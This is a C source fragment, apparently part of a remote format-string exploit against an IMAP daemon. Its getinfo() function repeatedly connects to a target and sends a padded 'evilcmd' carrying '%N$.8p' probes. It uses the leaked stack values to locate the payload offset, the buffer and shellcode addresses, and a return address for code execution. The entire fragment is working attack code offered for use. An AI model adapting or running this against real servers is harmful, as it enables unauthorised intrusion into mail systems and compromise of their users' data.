
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






struct in_addr {int dummy; } ;
struct sockaddr_in {char sin_zero; struct in_addr sin_addr; int sin_port; int sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef int recvbuf ;
typedef int evilcmd ;


 int AF_INET ;
 int BUFFERSIZE ;
 int SOCK_STREAM ;
 int TIMEOUT ;
 scalar_t__ bretaddr ;
 int bzero (char*,int) ;
 scalar_t__ chkshaddr (char*,unsigned int,int) ;
 int close (int) ;
 int connect_timeout (int,struct sockaddr*,int,int ) ;
 int exit (int) ;
 int fflush (int ) ;
 struct hostent* gethostbyname (char*) ;
 int herror (char*) ;
 int htons (unsigned int) ;
 int memset (char*,int,int) ;
 int pos ;
 int printf (char*,...) ;
 int read (int,char*,int) ;
 scalar_t__ shaddr ;
 int socket (int ,int ,int ) ;
 int sprintf (char*,char*,int) ;
 int stdout ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 char* strstr (char*,char*) ;
 scalar_t__ strtoul (char*,int ,int ) ;
 int write (int,char*,int ) ;

void getinfo(char *host, unsigned int imapdport) {
 char recvbuf[BUFFERSIZE], evilcmd[BUFFERSIZE], temp[BUFFERSIZE],*addr=((void*)0);
 struct hostent *he;
 struct sockaddr_in dest_dir;
 int sockfd, i;

 if((he=gethostbyname(host)) == ((void*)0)) {
  herror(" gethostbyname()");
  printf("\n");
  exit(1);
        }

 printf(" [*] getting target info...\n");
 fflush(stdout);

 for(i=1; i<50; i++) {

  bzero(recvbuf, sizeof(recvbuf));

  sockfd=socket(AF_INET, SOCK_STREAM, 0);

  dest_dir.sin_family = AF_INET;
  dest_dir.sin_port = htons(imapdport);
  dest_dir.sin_addr = *((struct in_addr *)he->h_addr);
  bzero(&(dest_dir.sin_zero), 8);

  connect_timeout(sockfd, (struct sockaddr *)&dest_dir,
   sizeof(struct sockaddr), TIMEOUT);

  read(sockfd, recvbuf, sizeof(recvbuf));

  memset(evilcmd, 0x00, sizeof(evilcmd));
  memset(evilcmd, 0x41, 496);
  strcat(evilcmd, "BBBBBBBBBBBB");
  sprintf(temp, ".%%%u$.8p\n", i);
  strcat(evilcmd, temp);

  write(sockfd, evilcmd, strlen(evilcmd));
  read(sockfd, recvbuf, sizeof(recvbuf));

  close(sockfd);

  addr = strstr(recvbuf, ".");

  if(pos == 0) if(strstr(addr, "42424242")) pos = i;

  if(shaddr == 0) {
   if(strstr(addr, "0x08")) {
    if(chkshaddr(host, imapdport, i)) {
     shaddr = strtoul(++addr, 0, 0);
     printf(" [*] buffer address\t\t: %.8p\n", shaddr);
     shaddr += 350;
     printf(" [*] shellcode address\t\t: %.8p\n", shaddr);
    }
   }
  }

  if(bretaddr == 0) {
   if(strstr(addr, "0xbf")) {
    bretaddr = strtoul(++addr, 0, 0);
    printf(" [*] basic return address\t: %.8p\n", bretaddr);
   }
  }

  if(pos != 0 && shaddr != 0 && bretaddr != 0) break;
 }

 if(shaddr == 0) {
  printf(" [*] shellcode address\t\t: not found!\n\n");
  exit(1);
 }

 if(bretaddr == 0) {
  printf(" [*] basic return address\t: not found!\n\n");
  exit(1);
 }

 printf("\n");
}
